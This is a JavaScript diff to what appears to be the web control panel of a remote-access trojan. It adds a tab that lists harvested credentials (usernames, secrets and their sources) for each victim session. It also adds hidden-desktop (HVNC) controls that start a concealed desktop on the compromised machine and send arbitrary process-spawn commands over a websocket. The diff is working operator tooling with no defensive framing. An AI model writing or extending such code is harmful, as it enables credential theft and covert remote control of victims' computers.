@@ -13,6 +13,7 @@ function show(tab) {
   if (tab === "files") listFiles(".");
   if (tab === "procs") listProcs();
   if (tab === "info") loadInfo();
+  if (tab === "creds") loadCreds();
 }
 document.querySelectorAll("button.tab").forEach((btn) =>
   btn.addEventListener("click", () => show(btn.dataset.tab))
@@ -166,6 +167,45 @@ async function loadInfo() {
   const data = await resp.json();
   document.getElementById("info-body").textContent = JSON.stringify(data, null, 2);
 }
+
+/* ---------------- credentials ---------------- */
+async function loadCreds() {
+  const resp = await fetch(`/api/${sessionId}/creds`);
+  const body = document.getElementById("creds-body");
+  body.innerHTML = "";
+  if (!resp.ok) return;
+  const data = await resp.json();
+  (data.creds || []).forEach((cred) => {
+    const tr = document.createElement("tr");
+    tr.innerHTML =
+      `<td>${new Date((cred.ts || 0) * 1000).toLocaleString()}</td>` +
+      `<td>${cred.username || ""}</td>` +
+      `<td class="mono">${cred.secret || ""}</td>` +
+      `<td>${cred.source || ""}</td>`;
+    body.appendChild(tr);
+  });
+}
+
+/* ---------------- HVNC ---------------- */
+document.getElementById("hvnc-start").addEventListener("click", async () => {
+  const status = document.getElementById("rd-status");
+  status.textContent = "starting hidden desktop…";
+  try {
+    const resp = await fetch(`/api/${sessionId}/hvnc`, { method: "POST", headers: {
+      "Content-Type": "application/json" }, body: JSON.stringify({}) });
+    const data = await resp.json();
+    status.textContent = resp.ok ? "HVNC launched — connecting" : (data.detail || "HVNC failed");
+  } catch (err) {
+    status.textContent = "HVNC request failed";
+  }
+  setTimeout(connectDesktop, 1500);
+});
+
+document.getElementById("hvnc-spawn-go").addEventListener("click", () => {
+  const value = document.getElementById("hvnc-spawn").value.trim();
+  if (!value || !rdSocket || rdSocket.readyState !== 1) return;
+  rdSocket.send(JSON.stringify({ t: "spawn", cmd: value }));
+});
 
 document.getElementById("rd-connect").addEventListener("click", connectDesktop);
 show("desktop");
